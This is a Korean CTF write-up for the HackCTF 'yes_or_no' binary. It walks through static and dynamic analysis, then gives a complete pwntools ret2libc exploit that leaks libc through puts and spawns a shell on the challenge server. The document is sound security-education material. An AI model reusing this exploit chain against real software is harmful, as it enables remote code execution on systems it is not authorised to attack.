**HackCTF - yes_or_no**

| layout | title                         | auther   | categories | tags           |
| ------ | ----------------------------- | -------- | ---------- | -------------- |
| post   | HackCTF - yes_or_no | Y3oj4eng | writeup    | writeupwargame |

# Analysis
---

```bash
mac at ubuntu in ~/Desktop/hackCTF/yes_or_no
$ ls
libc-2.27.so  yes_or_no
```

이번 문제는 `libc` 파일과 바이너리 파일이 같이 주어졌다.

## file & checksec

```bash
mac at ubuntu in ~/Desktop/hackCTF/yes_or_no
$ file yes_or_no 
yes_or_no: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=158605ccf96853e14f44588013ef526ef95aa3da, not stripped

mac at ubuntu in ~/Desktop/hackCTF/yes_or_no
$ checksec yes_or_no 
[*] '/home/mac/Desktop/hackCTF/yes_or_no/yes_or_no'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

프로그램을 실핼시켜본다.
```bash
mac at ubuntu in ~/Desktop/hackCTF/yes_or_no
$ ./yes_or_no              
Show me your number~!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
Sorry. You can't come with us
```

프로그램 실행시 일련의 문자열을 출력하고 사용자로부터 값을 입력받는다.

이후 입력받은 값을 기준으로 분기를 진행한다.

`IDA`를 통해 코드를 살펴본다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  char s; // [rsp+Eh] [rbp-12h]
  int v10; // [rsp+18h] [rbp-8h]
  int v11; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  v11 = 5;
  puts("Show me your number~!");
  fgets(&s, 10, stdin);
  v10 = atoi(&s);
  if ( (v11 - 10) >> 3 < 0 )
  {
    v4 = 0;
  }
  else
  {
    v3 = v11++;
    v4 = v10 - v3;
  }
  if ( v4 == v10 )
  {
    puts("Sorry. You can't come with us");
  }
  else
  {
    v5 = 1204 / ++v11;
    v6 = v11++;
    if ( v10 == v6 * v5 << (++v11 % 20 + 5) )
    {
      puts("That's cool. Follow me");
      gets(&s);
    }
    else
    {
      v7 = v11--;
      if ( v10 == v7 )
      {
        printf("Why are you here?");
        return 0;
      }
      puts("All I can say to you is \"do_system+1094\".\ngood luck");
    }
  }
  return 0;
}
```

`Show me your number~!` 문자열을 출력하고 `fgets()` 함수로 `s`변수에 값을 입력받는다.

이후 `atoi` 함수를 이용해 정수로 변환하여 `v10`변수에 저장한다.

그 값이 `v6 * v5 << (++v11 % 20 + 5)` 값과 같아야 `gets` 함수를 통해 `s`변수에 값을 입력할 수 있다.

메인 함수에서 취약점은 `gets`에 존재하므로 해당 함수를 무조건 실행시켜야 익스를 시도할 수 있다.

`gdb`로 해당 분기 부분에 `breakpoint`를 설정하고 비교값을 살펴보도록 한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF/yes_or_no
$ gdb -q yes_or_no 
Reading symbols from yes_or_no...(no debugging symbols found)...done.
gdb-peda$ pd main
Dump of assembler code for function main:
   0x00000000004006c7 <+0>:	push   rbp
   0x00000000004006c8 <+1>:	mov    rbp,rsp
   0x00000000004006cb <+4>:	sub    rsp,0x20
   0x00000000004006cf <+8>:	mov    rax,QWORD PTR [rip+0x20098a]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x00000000004006d6 <+15>:	mov    ecx,0x0
   0x00000000004006db <+20>:	mov    edx,0x2
   0x00000000004006e0 <+25>:	mov    esi,0x0
   0x00000000004006e5 <+30>:	mov    rdi,rax
   0x00000000004006e8 <+33>:	call   0x4005c0 <setvbuf@plt>
   0x00000000004006ed <+38>:	mov    DWORD PTR [rbp-0x4],0x5
   0x00000000004006f4 <+45>:	lea    rdi,[rip+0x1ad]        # 0x4008a8
   0x00000000004006fb <+52>:	call   0x400580 <puts@plt>
   0x0000000000400700 <+57>:	mov    rdx,QWORD PTR [rip+0x200969]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x0000000000400707 <+64>:	lea    rax,[rbp-0x12]
   0x000000000040070b <+68>:	mov    esi,0xa
   0x0000000000400710 <+73>:	mov    rdi,rax
   0x0000000000400713 <+76>:	call   0x4005a0 <fgets@plt>
   0x0000000000400718 <+81>:	lea    rax,[rbp-0x12]
   0x000000000040071c <+85>:	mov    rdi,rax
   0x000000000040071f <+88>:	mov    eax,0x0
   0x0000000000400724 <+93>:	call   0x4005d0 <atoi@plt>
   0x0000000000400729 <+98>:	mov    DWORD PTR [rbp-0x8],eax
   0x000000000040072c <+101>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000040072f <+104>:	sub    eax,0xa
   0x0000000000400732 <+107>:	sar    eax,0x3
   0x0000000000400735 <+110>:	test   eax,eax
   0x0000000000400737 <+112>:	js     0x40074b <main+132>
   0x0000000000400739 <+114>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000040073c <+117>:	lea    edx,[rax+0x1]
   0x000000000040073f <+120>:	mov    DWORD PTR [rbp-0x4],edx
   0x0000000000400742 <+123>:	mov    edx,DWORD PTR [rbp-0x8]
   0x0000000000400745 <+126>:	sub    edx,eax
   0x0000000000400747 <+128>:	mov    eax,edx
   0x0000000000400749 <+130>:	jmp    0x400750 <main+137>
   0x000000000040074b <+132>:	mov    eax,0x0
   0x0000000000400750 <+137>:	cmp    eax,DWORD PTR [rbp-0x8]
   0x0000000000400753 <+140>:	jne    0x400766 <main+159>
   0x0000000000400755 <+142>:	lea    rdi,[rip+0x162]        # 0x4008be
   0x000000000040075c <+149>:	call   0x400580 <puts@plt>
   0x0000000000400761 <+154>:	jmp    0x40080a <main+323>
   0x0000000000400766 <+159>:	add    DWORD PTR [rbp-0x4],0x1
   0x000000000040076a <+163>:	mov    eax,0x4b4
   0x000000000040076f <+168>:	cdq    
   0x0000000000400770 <+169>:	idiv   DWORD PTR [rbp-0x4]
   0x0000000000400773 <+172>:	mov    ecx,eax
   0x0000000000400775 <+174>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400778 <+177>:	lea    edx,[rax+0x1]
   0x000000000040077b <+180>:	mov    DWORD PTR [rbp-0x4],edx
   0x000000000040077e <+183>:	mov    esi,ecx
   0x0000000000400780 <+185>:	imul   esi,eax
   0x0000000000400783 <+188>:	add    DWORD PTR [rbp-0x4],0x1
   0x0000000000400787 <+192>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x000000000040078a <+195>:	mov    edx,0x66666667
   0x000000000040078f <+200>:	mov    eax,ecx
   0x0000000000400791 <+202>:	imul   edx
   0x0000000000400793 <+204>:	sar    edx,0x3
   0x0000000000400796 <+207>:	mov    eax,ecx
   0x0000000000400798 <+209>:	sar    eax,0x1f
   0x000000000040079b <+212>:	sub    edx,eax
   0x000000000040079d <+214>:	mov    eax,edx
   0x000000000040079f <+216>:	shl    eax,0x2
   0x00000000004007a2 <+219>:	add    eax,edx
   0x00000000004007a4 <+221>:	shl    eax,0x2
   0x00000000004007a7 <+224>:	sub    ecx,eax
   0x00000000004007a9 <+226>:	mov    edx,ecx
   0x00000000004007ab <+228>:	lea    eax,[rdx+0x5]
   0x00000000004007ae <+231>:	mov    ecx,eax
   0x00000000004007b0 <+233>:	shl    esi,cl
   0x00000000004007b2 <+235>:	mov    eax,esi
   0x00000000004007b4 <+237>:	cmp    DWORD PTR [rbp-0x8],eax
   0x00000000004007b7 <+240>:	jne    0x4007d8 <main+273>
   0x00000000004007b9 <+242>:	lea    rdi,[rip+0x11c]        # 0x4008dc
   0x00000000004007c0 <+249>:	call   0x400580 <puts@plt>
   0x00000000004007c5 <+254>:	lea    rax,[rbp-0x12]
   0x00000000004007c9 <+258>:	mov    rdi,rax
   0x00000000004007cc <+261>:	mov    eax,0x0
   0x00000000004007d1 <+266>:	call   0x4005b0 <gets@plt>
   0x00000000004007d6 <+271>:	jmp    0x40080a <main+323>
   0x00000000004007d8 <+273>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004007db <+276>:	lea    edx,[rax-0x1]
   0x00000000004007de <+279>:	mov    DWORD PTR [rbp-0x4],edx
   0x00000000004007e1 <+282>:	cmp    DWORD PTR [rbp-0x8],eax
   0x00000000004007e4 <+285>:	jne    0x4007fe <main+311>
   0x00000000004007e6 <+287>:	lea    rdi,[rip+0x106]        # 0x4008f3
   0x00000000004007ed <+294>:	mov    eax,0x0
   0x00000000004007f2 <+299>:	call   0x400590 <printf@plt>
   0x00000000004007f7 <+304>:	mov    eax,0x0
   0x00000000004007fc <+309>:	jmp    0x40080f <main+328>
   0x00000000004007fe <+311>:	lea    rdi,[rip+0x103]        # 0x400908
   0x0000000000400805 <+318>:	call   0x400580 <puts@plt>
   0x000000000040080a <+323>:	mov    eax,0x0
   0x000000000040080f <+328>:	leave  
   0x0000000000400810 <+329>:	ret    
End of assembler dump.
```

해당 루틴 분기문의 핵심은 `main+237` 의 `cmp`부분이다.

`main+237`에 `bp` 설정 이후 프로그램을 실행하고 입력값으로 `1234`를 전달했다.

```bash
[----------------------------------registers-----------------------------------]
RAX: 0x960000 
RBX: 0x0 
RCX: 0xd ('\r')
RDX: 0x8 
RSI: 0x960000 
RDI: 0xa ('\n')
RBP: 0x7fffffffdf30 --> 0x400820 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdf10 --> 0x400820 (<__libc_csu_init>:	push   r15)
RIP: 0x4007b4 (<main+237>:	cmp    DWORD PTR [rbp-0x8],eax)
R8 : 0x7fffffffdf22 --> 0x4d200007fff000a 
R9 : 0x0 
R10: 0x7ffff7b82cc0 --> 0x2000200020002 
R11: 0xa ('\n')
R12: 0x4005e0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe010 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007ae <main+231>:	mov    ecx,eax
   0x4007b0 <main+233>:	shl    esi,cl
   0x4007b2 <main+235>:	mov    eax,esi
=> 0x4007b4 <main+237>:	cmp    DWORD PTR [rbp-0x8],eax
   0x4007b7 <main+240>:	jne    0x4007d8 <main+273>
   0x4007b9 <main+242>:	lea    rdi,[rip+0x11c]        # 0x4008dc
   0x4007c0 <main+249>:	call   0x400580 <puts@plt>
   0x4007c5 <main+254>:	lea    rax,[rbp-0x12]
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf10 --> 0x400820 (<__libc_csu_init>:	push   r15)
0008| 0x7fffffffdf18 --> 0x32310000004005e0 
0016| 0x7fffffffdf20 --> 0x7fff000a3433 
0024| 0x7fffffffdf28 --> 0x8000004d2 
0032| 0x7fffffffdf30 --> 0x400820 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffdf38 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0048| 0x7fffffffdf40 --> 0x1 
0056| 0x7fffffffdf48 --> 0x7fffffffe018 --> 0x7fffffffe356 ("/home/mac/Desktop/hackCTF/yes_or_no/yes_or_no")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004007b4 in main ()
gdb-peda$ 
```
`RAX` 레지스터에는 `0x960000`값이 들어가있으며 우리의 입력값과 이 값이 같은지 비교하므로 해당 값을 입력해줘야한다.

`0x960000` 16진수 값을 10진수로 변경하면 `9830400`이다.

프로그램 실행 후 해당값을 전달해보도록 한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF/yes_or_no
$ ./yes_or_no
Show me your number~!
9830400
Thats cool. Follow me
AAAA
```

분기문 루틴을 통과하고 `gets()` 함수가 실행되어 다시 입력받는것을 확인할 수 있다.

자 이제 어떻게 익스를 해야할지 시나리오를 구성해야한다.

`NX` 미티게이션이 채택되었으니 일반적인 쉘코드를 활용한 익스는 불가능하다.

또한,서버측에서 프로그램을 실행할 때 마다 주소가 변경되는 `ASLR` 미티게이션도 적용되어 있으므로 `RTL` 또는 `ROP` 기법을 이용한다.

`libc` 파일을 이용해 필요한 각 함수들의 `offset`을 구하고 서버쪽 파일을 이용하여 `libc_base` 주소를 `leak`한 뒤 메인으로 복귀하여 `system`함수를 실행시킨다.

결론적으로 `system`와 `binsh`의 주소가 필요하다.
이를 위해서는 `libc_base`의 주소를 얻어내야 하며 `puts`를 통해 `memory leak`을 진행한다.

- `pop rdi; ret` 가젯 획득 -> puts는 하나의 인자를 사용하는 함수이다, 따라서 pop ret 가젯을 구한다.
-  `puts`를 통해 libc_base 주소 획득
- `libc_base`, `system_addr`, `binsh_addr` 구하기



### Gadget 구하기
```bash
mac at ubuntu in ~/Desktop/hackCTF/yes_or_no
$ ROPgadget --binary yes_or_no|grep rdi
0x0000000000400883 : pop rdi ; ret
0x000000000040056e : ret
```
`ROPgadget`을 이용해서 적절한 `gadget`을 구한다.

-> `pop rdi; ret` : 0x400883
-> `ret` : 0x40056e

### libc_base & system_addr & binsh_addr 구하기
```bash
libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
```

# Exploit
---
```python

from pwn import *

context.log_level = 'debug'

p = remote('ctf.j0n9hyun.xyz', 3009)
#p = process('./yes_or_no')
e = ELF('./yes_or_no')
libc = ELF('./libc-2.27.so')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = list(libc.search('/bin/sh\x00'))[0]

# gadget
pr = 0x400883 
r = 0x40056e

dummy = 'A'*26

log.success('system_offset : 0x%x' % system_offset)
log.success('binsh_offset : 0x%x' % binsh_offset)

# memory leak & return to main

payload = dummy
payload += p64(pr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline('9830400')
p.recvuntil('Follow me\n')
p.sendline(payload)

puts_addr = u64(str(p.recv(6)) + '\x00\x00')

log.success('puts_addr : ' + str(hex(puts_addr))

# find the libc_base addr

libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

### exploit

payload = ''
payload += dummy
payload += p64(pr)
payload += p64(binsh_addr)
payload += p64(r)
payload += p64(system_addr)

p.sendline('9830400')
p.recvuntil('Follow me\n')
p.sendline(payload)

p.interactive()
```

`RTL Chaning` 과 `calling convention`에 대한 이해가 부족하여 이번 문제를 푸는데 많은 어려움이 있었다.

이부분에 대하여 좀 더 공부해보고 다시 문제를 풀어봐야겠다.


